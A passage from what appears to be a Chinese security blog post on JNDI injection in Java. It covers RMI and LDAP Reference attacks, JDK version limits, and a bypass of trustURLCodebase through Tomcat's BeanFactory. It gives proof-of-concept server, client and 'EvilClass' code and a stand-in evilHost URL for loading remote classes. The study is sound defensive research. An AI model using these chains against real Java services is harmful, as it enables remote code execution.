</span></span><span style=display:flex><span><span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;demo&#34;</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>因为绑定的是 <code>Reference</code> 对象，客户端在本地 <code>CLASSPATH</code> 查找 <code>Exploit</code> 类，如果没有则根据设定的 <code>Reference</code> 属性，到<code>URL</code>： <a href=http://evilhost/Exploit.class>http://evilHost/Exploit.class</a> 获取构造对象实例，构造方法中的恶意代码就会被执行</p><p><img src=https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/10.png alt=img></p><h2 id=ldapreference>LDAP+Reference</h2><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如<code>ldap://xxx/xxx</code>，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象</p><p>**注意：**LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制</p><p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用</p><p>所以，利用前提是JDK8u91, 7u201, 6u211以下</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Context</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;ldap://localhost:1234/EvilObject&#34;</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><h2 id=rmi>RMI</h2><h3 id=低版本>低版本</h3><p>服务端</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.jndi.rmi.registry.ReferenceWrapper</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.Reference</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.registry.LocateRegistry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.registry.Registry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>ServerExp</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>args</span><span style=color:#f92672>[])</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Registry</span> <span style=color:#111>registry</span> <span style=color:#f92672>=</span> <span style=color:#111>LocateRegistry</span><span style=color:#f92672>.</span><span style=color:#75af00>createRegistry</span><span style=color:#f92672>(</span><span style=color:#ae81ff>1099</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#111>String</span> <span style=color:#111>factoryUrl</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://localhost:1098/&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Reference</span> <span style=color:#111>reference</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;EvilClass&#34;</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;EvilClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>factoryUrl</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>ReferenceWrapper</span> <span style=color:#111>wrapper</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ReferenceWrapper</span><span style=color:#f92672>(</span><span style=color:#111>reference</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>registry</span><span style=color:#f92672>.</span><span style=color:#75af00>bind</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Foo&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>wrapper</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>err</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Server ready, factoryUrl:&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>factoryUrl</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>err</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Server exception: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>客户端</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.InitialContext</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.NamingException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.directory.*</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Hashtable</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>JNDILookup</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Object</span> <span style=color:#111>ret</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>().</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;rmi://127.0.0.1:1099/Foo&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;ret: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>ret</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>NamingException</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>恶意类</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.Context</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.Name</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.spi.ObjectFactory</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Hashtable</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>EvilClass</span> <span style=color:#00a8c8>implements</span> <span style=color:#111>ObjectFactory</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>log</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>key</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;EvilClass: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>key</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// do nothing
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>EvilClass</span><span style=color:#f92672>.</span><span style=color:#75af00>log</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;IIB block&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>static</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>EvilClass</span><span style=color:#f92672>.</span><span style=color:#75af00>log</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;static block&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#75af00>EvilClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>EvilClass</span><span style=color:#f92672>.</span><span style=color:#75af00>log</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;constructor&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>getObjectInstance</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>Name</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>Context</span> <span style=color:#111>nameCtx</span><span style=color:#f92672>,</span> <span style=color:#111>Hashtable</span><span style=color:#f92672>&lt;?,</span> <span style=color:#f92672>?&gt;</span> <span style=color:#111>environment</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>EvilClass</span><span style=color:#f92672>.</span><span style=color:#75af00>log</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getObjectInstance&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>执行顺序</p><pre tabindex=0><code>static在类加载的时候执行
代码块和无参构造方法在clas.newInstance()时执行
</code></pre><h3 id=高版本>高版本</h3><p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码</p><p>深入代码中，问题出在高版本JDK中的<code> com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code></p><p><img src=https://storage.tttang.com/media/attachment/2022/05/25/9c1c98e2-c3cd-48dd-bf2b-812e1e3176e8.png alt=analysis1.png></p><p>其中 <code>getFactoryClassLocation()</code>方法是获取<code>classFactoryLocation</code>地址，可以看到，在 <code>ref != null && ref.getFactoryClassLocation() != null</code> 的情况下，会对 <code>trustURLCodebase</code> 进行取反，由于在 <code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 版本及以后， <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code> ，所以会进入 <code>if</code> 语句，抛出异常</p><h4 id=绕过>绕过</h4><p>如果要解码的对象 <code>r</code> 是远程引用，就需要先解引用然后再调用 <code>NamingManager.getObjectInstance</code>，其中会实例化对应的 <code>ObjectFactory</code> 类并调用其 <code>getObjectInstance</code> 方法，这也符合我们前面打印的 <code>EvilClass</code> 的执行顺序</p><p>为了绕过这里 <code>ConfigurationException</code> 的限制，我们有三种思路</p><ul><li>令 <code>trustURLCodebase</code> 为 <code>true</code></li></ul><p>在命令行指定 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 参数，前面用过</p><ul><li>令 <code>ref</code> 为空</li></ul><p>从语义上看需要 <code>obj</code> 既不是 <code>Reference</code> 也不是 <code>Referenceable</code>。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程 <code>RMI</code> 没有操作的空间，因此这种情况不太好利用</p><ul><li>令 <code>ref.getFactoryClassLocation()</code> 为空</li></ul><p>让 <code>ref</code> 对象的 <code>classFactoryLocation</code> 属性为空，这个属性表示引用所指向对象的对应 <code>factory</code> 名称，对于远程代码加载而言是 <code>codebase</code>，即远程代码的 <code>URL</code> 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 <code>factory</code> 是本地代码，则该值为空，这是绕过高版本 <code>JDK</code> 限制的关键；</p><p>为了满足这种方法，我们只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code>，接着看javax.naming.spi.NamingManager#getObejctInstance的解析过程</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#111>Object</span> <span style=color:#75af00>getObjectInstance</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>refInfo</span><span style=color:#f92672>,</span> <span style=color:#111>Name</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>Context</span> <span style=color:#111>nameCtx</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                      <span style=color:#111>Hashtable</span><span style=color:#f92672>&lt;?,?&gt;</span> <span style=color:#111>environment</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>ObjectFactory</span> <span style=color:#111>factory</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Use builder if installed
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>ObjectFactoryBuilder</span> <span style=color:#111>builder</span> <span style=color:#f92672>=</span> <span style=color:#111>getObjectFactoryBuilder</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>builder</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// builder must return non-null factory
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>factory</span> <span style=color:#f92672>=</span> <span style=color:#111>builder</span><span style=color:#f92672>.</span><span style=color:#75af00>createObjectFactory</span><span style=color:#f92672>(</span><span style=color:#111>refInfo</span><span style=color:#f92672>,</span> <span style=color:#111>environment</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>factory</span><span style=color:#f92672>.</span><span style=color:#75af00>getObjectInstance</span><span style=color:#f92672>(</span><span style=color:#111>refInfo</span><span style=color:#f92672>,</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>nameCtx</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>            <span style=color:#111>environment</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Use reference if possible
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>Reference</span> <span style=color:#111>ref</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>refInfo</span> <span style=color:#00a8c8>instanceof</span> <span style=color:#111>Reference</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ref</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Reference</span><span style=color:#f92672>)</span> <span style=color:#111>refInfo</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>refInfo</span> <span style=color:#00a8c8>instanceof</span> <span style=color:#111>Referenceable</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ref</span> <span style=color:#f92672>=</span> <span style=color:#f92672>((</span><span style=color:#111>Referenceable</span><span style=color:#f92672>)(</span><span style=color:#111>refInfo</span><span style=color:#f92672>)).</span><span style=color:#75af00>getReference</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>Object</span> <span style=color:#111>answer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>ref</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>ref</span><span style=color:#f92672>.</span><span style=color:#75af00>getFactoryClassName</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>f</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// if reference identifies a factory, use exclusively
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>factory</span> <span style=color:#f92672>=</span> <span style=color:#111>getObjectFactoryFromReference</span><span style=color:#f92672>(</span><span style=color:#111>ref</span><span style=color:#f92672>,</span> <span style=color:#111>f</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>factory</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>return</span> <span style=color:#111>factory</span><span style=color:#f92672>.</span><span style=color:#75af00>getObjectInstance</span><span style=color:#f92672>(</span><span style=color:#111>ref</span><span style=color:#f92672>,</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>nameCtx</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                                                 <span style=color:#111>environment</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// No factory found, so return original refInfo.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// Will reach this point if factory class is not in
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// class path and reference does not contain a URL for it
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>return</span> <span style=color:#111>refInfo</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// if reference has no factory, check for addresses
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// containing URLs
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>answer</span> <span style=color:#f92672>=</span> <span style=color:#111>processURLAddrs</span><span style=color:#f92672>(</span><span style=color:#111>ref</span><span style=color:#f92672>,</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>nameCtx</span><span style=color:#f92672>,</span> <span style=color:#111>environment</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>answer</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>return</span> <span style=color:#111>answer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// try using any specified factories
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>answer</span> <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>        <span style=color:#111>createObjectFromFactories</span><span style=color:#f92672>(</span><span style=color:#111>refInfo</span><span style=color:#f92672>,</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>nameCtx</span><span style=color:#f92672>,</span> <span style=color:#111>environment</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#f92672>(</span><span style=color:#111>answer</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>?</span> <span style=color:#111>answer</span> <span style=color:#f92672>:</span> <span style=color:#111>refInfo</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>可以看到在处理 <code>Reference</code> 对象时，会先调用 <code>ref.getFactoryClassName()</code> 获取对应工厂类的名称，也就是会先从本地的<code>CLASSPATH</code>中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。之后会执行静态代码块、代码块、无参构造函数和<code>getObjectInstance</code>方法。那么只需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在这四个地方其中一块能执行<code>payload</code>就可以了。但<code>getObjectInstance</code>方法需要你的类实现<code>javax.naming.spi.ObjectFactory</code>接口</p><p>因此，我们实际上可以指定一个存在于目标 <code>classpath</code> 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制。</p><p>整个利用过程的主要调用栈如下：</p><pre tabindex=0><code>InitialContext#lookup()
  RegistryContext#lookup()
    RegistryContext#decodeObject()
      NamingManager#getObjectInstance()
          objectfactory = NamingManager#getObjectFactoryFromReference()
                  Class#newInstance()  //--&gt;恶意代码被执行
     或:   objectfactory#getObjectInstance()  //--&gt;恶意代码被执行
</code></pre><p>满足要求的工厂类条件：</p><ul><li>存在于目标本地的 <code>CLASSPATH</code> 中</li><li>实现 <code>javax.naming.spi.ObjectFactory</code> 接口</li><li>至少存在一个 <code>getObjectInstance()</code> 方法</li></ul><p>存在于 <code>Tomcat</code> 依赖包中的 <code>org.apache.naming.factory.BeanFactory</code> 就是个不错的选择
<code>org.apache.naming.factory.BeanFactory</code> ，这个类在 <code>Tomcat</code> 中，很多 <code>web</code> 应用都会包含，它的关键代码如下</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>getObjectInstance</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>Name</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>Context</span> <span style=color:#111>nameCtx</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                                <span style=color:#111>Hashtable</span><span style=color:#f92672>&lt;?,?&gt;</span> <span style=color:#111>environment</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>throws</span> <span style=color:#111>NamingException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>Reference</span> <span style=color:#111>ref</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Reference</span><span style=color:#f92672>)</span> <span style=color:#111>obj</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>String</span> <span style=color:#111>beanClassName</span> <span style=color:#f92672>=</span> <span style=color:#111>ref</span><span style=color:#f92672>.</span><span style=color:#75af00>getClassName</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>ClassLoader</span> <span style=color:#111>tcl</span> <span style=color:#f92672>=</span> <span style=color:#111>Thread</span><span style=color:#f92672>.</span><span style=color:#75af00>currentThread</span><span style=color:#f92672>().</span><span style=color:#75af00>getContextClassLoader</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 1. 反射获取类对象
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>tcl</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>beanClass</span> <span style=color:#f92672>=</span> <span style=color:#111>tcl</span><span style=color:#f92672>.</span><span style=color:#75af00>loadClass</span><span style=color:#f92672>(</span><span style=color:#111>beanClassName</span><span style=color:#f92672>);</span>
